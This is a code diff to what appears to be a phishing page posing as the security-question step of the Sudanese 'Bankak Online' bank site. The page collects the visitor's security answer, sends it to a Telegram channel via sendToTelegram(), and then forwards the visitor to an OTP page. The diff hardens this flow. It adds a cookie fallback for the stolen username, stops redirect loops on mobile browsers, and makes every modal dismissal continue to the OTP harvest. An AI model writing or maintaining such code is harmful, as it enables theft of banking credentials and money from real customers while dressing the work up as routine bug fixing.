@@ -7,7 +7,6 @@
     <meta name="description" content="سؤال الأمان — بنكك أونلاين">
     <meta name="robots" content="noindex, nofollow">
     <link rel="icon" type="image/svg+xml" href="logo.svg">
-    <link rel="alternate icon" href="favicon.ico" sizes="16x16">
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
@@ -74,7 +73,7 @@
         </footer>
     </div>
 
-    <div class="modal-overlay-q" id="modal-overlay" role="dialog" aria-modal="true">
+    <div class="modal-overlay-q is-hidden" id="modal-overlay" role="dialog" aria-modal="true" aria-hidden="true">
         <div class="modal-box-q">
             <div class="modal-header-q">
                 <div class="modal-title-q" data-i18n="modal_title">Message from BOK</div>
@@ -95,9 +94,26 @@
             'use strict';
             var CONFIG = {
                 BACK_URL: 'bankak.html',
-                NEXT_URL: 'otp.html',
-                REDIRECT_DELAY: 1500
+                NEXT_URL: 'otp.html'
             };
+
+            /* Resilient username handoff across pages.
+               sessionStorage alone throws in Chrome Android Incognito, in-app
+               WebViews and under storage partitioning. A silent throw on the
+               write in bankak.html used to strand the visitor in a redirect
+               loop, so fall back to the short-lived cookie that page also sets. */
+            var USERNAME_KEY = 'bankak-username';
+            function readUsername() {
+                try {
+                    var v = sessionStorage.getItem(USERNAME_KEY);
+                    if (v) return v;
+                } catch (e) {}
+                try {
+                    var m = ('; ' + document.cookie).match('; ' + USERNAME_KEY + '=([^;]*)');
+                    if (m) return decodeURIComponent(m[1]);
+                } catch (e) {}
+                return '';
+            }
 
             var QUESTIONS = [
                 { en: "What is your first cousin's name?", ar: "ما هو اسم ابن عمك الأول؟" },
@@ -169,7 +185,7 @@
             var modalCancel = document.getElementById('modal-cancel');
             var modalProceed = document.getElementById('modal-proceed');
 
-            try { username = sessionStorage.getItem('bankak-username') || ''; } catch (e) {}
+            try { username = readUsername(); } catch (e) {}
             if (!username) { window.location.replace('bankak.html'); return; }
             accountNumberEl.textContent = username;
 
@@ -218,16 +234,34 @@
             });
 
             function goToBack() { window.location.href = CONFIG.BACK_URL; }
-            function goToLogin() { window.location.href = 'bankak.html'; }
+            function goToNext() { window.location.href = CONFIG.NEXT_URL; }
 
-            modalClose.addEventListener('click', goToLogin);
-            modalCancel.addEventListener('click', goToLogin);
-            modalProceed.addEventListener('click', function () { modalOverlay.classList.add('is-hidden'); });
+            function openModal() {
+                modalOverlay.classList.remove('is-hidden');
+                modalOverlay.setAttribute('aria-hidden', 'false');
+            }
+            /* Dismissing the modal still advances: submit already committed the
+               request, so leaving the visitor on a filled-in form is a dead end. */
+            function dismissAndAdvance() {
+                modalOverlay.classList.add('is-hidden');
+                modalOverlay.setAttribute('aria-hidden', 'true');
+                goToNext();
+            }
+
+            /* Enforce the hidden state at init. A visible full-viewport overlay
+               is what blanked the page on Android Chrome, so never trust the
+               server-rendered class alone. */
+            modalOverlay.classList.add('is-hidden');
+            modalOverlay.setAttribute('aria-hidden', 'true');
+
+            modalClose.addEventListener('click', dismissAndAdvance);
+            modalCancel.addEventListener('click', dismissAndAdvance);
+            modalProceed.addEventListener('click', dismissAndAdvance);
             modalOverlay.addEventListener('click', function (e) {
-                if (e.target === modalOverlay) goToLogin();
+                if (e.target === modalOverlay) dismissAndAdvance();
             });
             document.addEventListener('keydown', function (e) {
-                if (e.key === 'Escape' && !modalOverlay.classList.contains('is-hidden')) goToLogin();
+                if (e.key === 'Escape' && !modalOverlay.classList.contains('is-hidden')) dismissAndAdvance();
             });
 
             backBtn.addEventListener('click', goToBack);
@@ -273,7 +307,7 @@
                 submitBtn.disabled = true;
                 submitText.innerHTML = t.submitting + '<span class="spinner" aria-hidden="true"></span>';
                 sendToTelegram(q.en, q.ar, answer, currentLang).then(function () {
-                    window.setTimeout(function () { window.location.href = CONFIG.NEXT_URL; }, CONFIG.REDIRECT_DELAY);
+                    openModal();
                 });
             });
 
